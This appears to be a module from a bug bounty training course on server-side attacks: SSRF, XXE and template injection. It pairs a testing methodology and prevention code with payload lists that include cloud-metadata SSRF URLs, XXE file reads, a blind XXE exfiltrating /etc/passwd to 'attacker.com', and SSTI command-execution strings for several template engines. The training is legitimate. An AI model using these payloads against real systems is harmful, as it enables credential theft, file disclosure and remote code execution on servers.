# 🖧 Module 14: Server-Side Attacks

> **Level:** 🔴 Advanced | **Time:** ~4 hours | **Prerequisites:** Module 01-13

---

## 📖 Overview

Server-side attacks target the server infrastructure itself. This module covers Server-Side Request Forgery (SSRF), XML External Entity (XXE) injection, and Server-Side Template Injection (SSTI) — three of the most critical and highly rewarded vulnerability classes in modern bug bounty programs.

---

## ❓ Why It Matters

SSRF can grant access to internal cloud infrastructure, metadata services, and internal APIs. XXE can read local files and enable SSRF. SSTI can lead to Remote Code Execution. These vulnerabilities frequently earn **$5,000 to $100,000+** on major bug bounty platforms.

---

## 🌍 Real-World Example

Capital One's 2019 data breach (affecting 100 million customers) was caused by an SSRF vulnerability that allowed an attacker to access AWS EC2 metadata, retrieve IAM credentials, and exfiltrate S3 bucket data. A similar SSRF found in a bug bounty program earned the researcher **$50,000**.

---

## 📋 Step-by-Step Methodology

### SSRF Testing

```
1. Find functionality that fetches URLs/content:
   - URL preview/import features
   - Webhook configurations
   - PDF generators
   - Image fetching from URL
   - File import from URL
   - "Test connection" features
   
2. Test if server makes requests to internal IPs:
   - 127.0.0.1
   - localhost
   - 169.254.169.254 (AWS metadata)
   - 10.x.x.x / 172.16.x.x / 192.168.x.x
   
3. Test blind SSRF with out-of-band detection:
   - Use Burp Collaborator
   - Use webhook.site
   - Use requestbin.com
```

---

## 🛠️ Tools Used

| Tool | Purpose |
|------|---------|
| **Burp Suite** | Intercept and test |
| **Burp Collaborator** | Out-of-band detection |
| **ssrfmap** | Automated SSRF scanner |
| **gopherus** | Generate Gopher SSRF payloads |

---

## 💡 Payload Examples

### SSRF Payloads

```
# Basic SSRF test
?url=http://127.0.0.1/
?url=http://localhost/
?url=http://0.0.0.0/

# AWS Metadata Service (IMDSv1)
?url=http://169.254.169.254/latest/meta-data/
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
?url=http://169.254.169.254/latest/user-data/

# GCP Metadata Service
?url=http://metadata.google.internal/computeMetadata/v1/instance/
?url=http://169.254.169.254/computeMetadata/v1/project/project-id

# Azure Metadata Service
?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Internal network scanning
?url=http://192.168.1.1/
?url=http://10.0.0.1/
?url=http://172.16.0.1/

# SSRF bypass techniques
# IP encoding
?url=http://2130706433/   (127.0.0.1 as decimal)
?url=http://0x7f000001/   (127.0.0.1 as hex)
?url=http://0177.0.0.1/   (127.0.0.1 as octal)

# DNS rebinding
?url=http://ssrf.attacker.com/  (resolves to 127.0.0.1)

# URL parsing confusion
?url=http://legitimate.com@127.0.0.1/
?url=http://127.0.0.1#legitimate.com
?url=http://127.0.0.1?.legitimate.com

# Protocol smuggling
?url=dict://127.0.0.1:6379/
?url=gopher://127.0.0.1:6379/_PING
?url=file:///etc/passwd
```

### XXE Injection

```xml
<!-- Basic XXE - read local file -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>

<!-- Blind XXE with out-of-band exfiltration -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
  %remote;
  %oob;
]>
<root/>

<!-- evil.dtd hosted on attacker server -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % oob "<!ENTITY &#37; send SYSTEM 'http://attacker.com/?data=%file;'>">

<!-- XXE SSRF -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root><data>&xxe;</data></root>

<!-- XXE via SVG -->
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text y="16">&xxe;</text>
</svg>

<!-- XXE via Excel/XLSX -->
<!-- Place in xl/sharedStrings.xml -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

### SSTI Payloads

```
# Detection - inject template syntax and look for evaluation
{{7*7}}          → 49  (Jinja2, Twig)
${7*7}           → 49  (Freemarker, EL)
<%= 7*7 %>       → 49  (ERB)
#{7*7}           → 49  (Ruby)
*{7*7}           → 49  (Spring)
{{7*'7'}}        → 7777777 (Jinja2 specific)

# Jinja2 (Python/Flask) RCE
# Read file
{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}

# RCE
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Twig (PHP) RCE
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Freemarker (Java) RCE
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# Velocity (Java) RCE
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))##
#set($chr=$x.class.forName('java.lang.Character'))##
#set($str=$x.class.forName('java.lang.String'))##
#set($ex=$rt.getRuntime().exec('id'))##
```

---

## 🛡️ Prevention

### SSRF Prevention

```python
# Whitelist allowed URLs/IPs
import ipaddress
from urllib.parse import urlparse

ALLOWED_HOSTS = ['api.trusted.com', 'uploads.trusted.com']

def is_safe_url(url):
    parsed = urlparse(url)
    
    # Check against whitelist
    if parsed.netloc not in ALLOWED_HOSTS:
        return False
    
    # Resolve IP and check it's not internal
    ip = socket.gethostbyname(parsed.hostname)
    ip_obj = ipaddress.ip_address(ip)
    
    if (ip_obj.is_private or ip_obj.is_loopback or 
        ip_obj.is_link_local or ip_obj.is_reserved):
        return False
    
    return True
```

### XXE Prevention

```xml
<!-- Disable external entity processing -->
```

```java
// Java - disable XXE
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

### SSTI Prevention

```python
# Never render user input as templates
# WRONG:
from jinja2 import Template
template = Template(user_input)  # VULNERABLE!

# RIGHT: Pass user data as template variables
from jinja2 import Environment
env = Environment()
template = env.from_string("Hello {{ name }}")
result = template.render(name=user_input)  # Safe
```

---

## 🧪 Practice Labs

| Lab | Link | Exercise |
|-----|------|---------|
| PortSwigger SSRF | [portswigger.net/web-security/ssrf](https://portswigger.net/web-security/ssrf) | SSRF labs |
| PortSwigger XXE | [portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) | XXE labs |
| PortSwigger SSTI | [portswigger.net/web-security/server-side-template-injection](https://portswigger.net/web-security/server-side-template-injection) | SSTI labs |
| HackTheBox | [hackthebox.com](https://hackthebox.com) | SSRF/SSTI machines |

---

<div align="center">

[← Module 13: File Inclusion](../13.%20File%20Inclusion/README.md) | [Next Module: Insecure Captcha →](../15.%20Insecure%20Captcha/README.md)

</div>
